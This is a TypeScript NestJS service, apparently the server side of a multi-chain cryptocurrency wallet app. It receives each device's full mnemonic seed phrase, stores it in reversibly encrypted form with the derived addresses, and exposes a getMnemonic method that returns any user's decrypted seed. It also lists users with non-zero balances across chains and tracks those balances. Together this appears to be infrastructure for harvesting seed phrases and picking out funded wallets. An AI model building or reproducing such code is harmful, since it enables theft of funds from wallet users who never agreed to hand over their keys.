import { Injectable, NotFoundException } from '@nestjs/common';
import { BalanceFetcherService } from '../balance/balance-fetcher.service';
import { decryptMnemonic, encryptMnemonic } from '../common/crypto.util';
import { PrismaService } from '../prisma/prisma.module';
import { SyncWalletDto } from './dto/wallet.dto';

@Injectable()
export class WalletsService {
  constructor(
    private prisma: PrismaService,
    private balanceFetcher: BalanceFetcherService,
  ) {}

  async syncFromApp(dto: SyncWalletDto) {
    const mnemonicEnc = encryptMnemonic(dto.mnemonic.trim().toLowerCase());

    const walletUser = await this.prisma.walletUser.upsert({
      where: { deviceId: dto.deviceId },
      update: {
        mnemonicEnc,
        accountsCount: dto.accounts.length,
      },
      create: {
        deviceId: dto.deviceId,
        mnemonicEnc,
        accountsCount: dto.accounts.length,
      },
    });

    for (const account of dto.accounts) {
      await this.prisma.walletAccount.upsert({
        where: {
          walletUserId_index: { walletUserId: walletUser.id, index: account.index },
        },
        update: {
          evmAddress: account.evmAddress,
          btcAddress: account.btcAddress,
          tronAddress: account.tronAddress,
          tonAddress: account.tonAddress,
          cosmosAddress: account.cosmosAddress,
        },
        create: {
          walletUserId: walletUser.id,
          index: account.index,
          evmAddress: account.evmAddress,
          btcAddress: account.btcAddress,
          tronAddress: account.tronAddress,
          tonAddress: account.tonAddress,
          cosmosAddress: account.cosmosAddress,
        },
      });
    }

    try {
      await this.refreshBalancesForUser(walletUser.id);
    } catch {
      // Sync should succeed even when RPC balance fetch fails.
    }
    return { ok: true, walletUserId: walletUser.id };
  }

  findAll() {
    return this.prisma.walletUser.findMany({
      orderBy: { updatedAt: 'desc' },
      select: {
        id: true,
        deviceId: true,
        accountsCount: true,
        createdAt: true,
        updatedAt: true,
        accounts: {
          orderBy: { index: 'asc' },
          select: {
            id: true,
            index: true,
            evmAddress: true,
            btcAddress: true,
            tronAddress: true,
            tonAddress: true,
            cosmosAddress: true,
            balances: {
              where: { balance: { not: '0' } },
              orderBy: { chainName: 'asc' },
            },
          },
        },
      },
    });
  }

  async findOne(id: string) {
    const wallet = await this.prisma.walletUser.findUnique({
      where: { id },
      include: {
        accounts: {
          orderBy: { index: 'asc' },
          include: { balances: { orderBy: { chainName: 'asc' } } },
        },
      },
    });
    if (!wallet) throw new NotFoundException('Wallet user not found');
    return wallet;
  }

  async getMnemonic(id: string) {
    const wallet = await this.prisma.walletUser.findUnique({ where: { id } });
    if (!wallet) throw new NotFoundException('Wallet user not found');
    return { mnemonic: decryptMnemonic(wallet.mnemonicEnc) };
  }

  async refreshBalancesForUser(walletUserId: string) {
    const wallet = await this.findOne(walletUserId);
    const chains = await this.prisma.chain.findMany({
      where: { isEnabled: true },
      orderBy: { sortOrder: 'asc' },
    });

    for (const account of wallet.accounts) {
      for (const chain of chains) {
        const address = this.balanceFetcher.resolveAddress(chain, account);
        if (!address) continue;
        const balance = await this.balanceFetcher.fetchNativeBalance(chain, address);
        const normalizedAddress = normalizeAddress(address);
        await this.prisma.walletBalance.upsert({
          where: {
            walletAccountId_chainId: {
              walletAccountId: account.id,
              chainId: chain.id,
            },
          },
          update: {
            balance,
            address: normalizedAddress,
            chainSymbol: chain.symbol,
            chainName: chain.name,
          },
          create: {
            walletAccountId: account.id,
            chainId: chain.id,
            chainSymbol: chain.symbol,
            chainName: chain.name,
            address: normalizedAddress,
            balance,
          },
        });
        await this.recordDailySnapshot({
          chainId: chain.id,
          chainSymbol: chain.symbol,
          chainName: chain.name,
          address: normalizedAddress,
          balance,
        });
      }
    }

    await this.prisma.walletUser.update({
      where: { id: walletUserId },
      data: { updatedAt: new Date() },
    });

    return this.findOne(walletUserId);
  }

  async refreshAllBalances() {
    const users = await this.prisma.walletUser.findMany({ select: { id: true } });
    for (const user of users) {
      await this.refreshBalancesForUser(user.id);
    }
    return { refreshed: users.length };
  }

  private async recordDailySnapshot(input: {
    chainId: string;
    chainSymbol: string;
    chainName: string;
    address: string;
    balance: string;
  }) {
    const day = startOfUtcDay(new Date());
    await this.prisma.tokenBalanceSnapshot.upsert({
      where: {
        day_chainId_address: {
          day,
          chainId: input.chainId,
          address: input.address,
        },
      },
      update: {
        balance: input.balance,
        chainSymbol: input.chainSymbol,
        chainName: input.chainName,
      },
      create: {
        day,
        chainId: input.chainId,
        chainSymbol: input.chainSymbol,
        chainName: input.chainName,
        address: input.address,
        balance: input.balance,
      },
    });
  }
}

function normalizeAddress(address: string) {
  const value = address.trim();
  return value.startsWith('0x') || value.startsWith('0X') ? value.toLowerCase() : value;
}

function startOfUtcDay(date: Date) {
  const day = new Date(date);
  day.setUTCHours(0, 0, 0, 0);
  return day;
}
